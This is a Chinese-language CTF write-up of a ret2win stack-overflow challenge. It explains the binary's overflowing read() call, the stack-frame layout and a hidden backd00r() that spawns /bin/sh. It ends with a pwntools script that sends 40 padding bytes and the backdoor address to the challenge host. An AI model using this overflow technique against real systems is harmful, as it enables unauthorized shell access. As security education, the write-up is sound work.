第一次写pwn的writeup,感觉很有趣(〃'▽'〃)
是一个关于栈溢出的题
# 初步探测
先使用linux的`file`命令,可以查看文件类型
```shell
fszz@fszz:/mnt/c/Users/fszz/Desktop$ file ./vuln

./vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=c222730a8011fb8d99911b14c8b630beb83263b9, for GNU/Linux 3.2.0, not stripped
```
有一些需要重点关注的信息:
- ELF:为linux可执行二进制文件
- 64-bit :
- LSB:小端序

****
## 复习一下什么是小端:
也就是低位在低地址,高位在高地址,举个例子:
地址        位
0001       3
0002       2
0003       1
0004       0
如果按照小端来读的话,就是0123  反之,大端就是3210
****
# 用ida打开
用f5反编译
有两个比较明显的函数
main()
```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF
  setbuf(stream: stdin, buf: nullptr);
  setbuf(stream: stdout, buf: nullptr);
  setbuf(stream: stderr, buf: nullptr);
  printf(format: "Can you tell me something about you?\n>");
  read(fd: 0, buf, nbytes: 0x38u);
  return 0;
}
```

首先该函数创建了一个buf(栈缓冲区),大小为32byte
`_BYTE`是ida使用的数据类型,表示一个byte
也可以看后面ida加的注释`// [rsp+0h] [rbp-20h] BYREF`
0h和20h代表16进制,所以这里表示:栈顶指针0偏移,栈底指针下移32byte

然后是下面的read函数:
fd:0前面见过,表示标准输入流
表示读取0x38u,也就是56byte,后面的那个u表示unsigned型

那这里就存在一个明显的栈溢出点了
首先,buf创建后,栈里面大概是这样的:

高地址
`返回地址`
`保存的旧rbp`     8byte
`buf[32]`          32byte
`***`
`buf[1]`
低地址
## 这里理解一下函数调用
在汇编里面执行`call`指令调用函数的时候
cpu执行了两个步骤:
`push rip //将rip压栈 `  rip,也就是pc(程序计数器),是报存下一条要执行的指令的寄存器
`rip = func`   将rip指向要执行的函数地址

`ret`指令总是与`call`配对的
他从栈顶弹出刚刚压进去的rip:`pop rip`,也就是将rip重新执行刚刚那里

而在函数内部,开始执行函数时会有一段固定的指令称"函数序言":
```asm
push rbp
mov rbp,rsp
sub rsp,0x**
```
先push旧的rbp
然后然rbp=rsp,也就是将rbp指向rsp,这样就指向了一个新的栈帧
最后为局部变量开辟空间
*****
所以这样栈里面就会先存在一个call时压入的rip地址
然后是保存的旧rbp
最后是函数的局部变量buf

所以只要read写入的部分溢出buf,就会写入旧的rbp和返回地址
****
backdoor()
```c
void __noreturn backd00r()
{
  system(command: "/bin/sh");
  exit(status: 0);
}
```
这里函数使用system()函数打开了/sh,这是一个shell,也就是命令解释器,他能执行我们输入的linux指令

那我们只需要将溢出到rip的控制为这个backdoor的地址,函数在ret时就会执行这个后门函数,从而可以获得命令执行权限

# 发送payload
使用pwntool
```python
from pwn import *
p = remote("forward.vidar.club", <端口号>)
payload = b'a' * 40 + p64(0x4011be)
p.sendline(payload)
p.interactive()#接管终端
```
这里的`p64()`函数可以直接默认以小端序将64位整数转化成以8个byte,低有效在前
用pwndbg可以查看后门函数的地址
接管终端后就解决啦!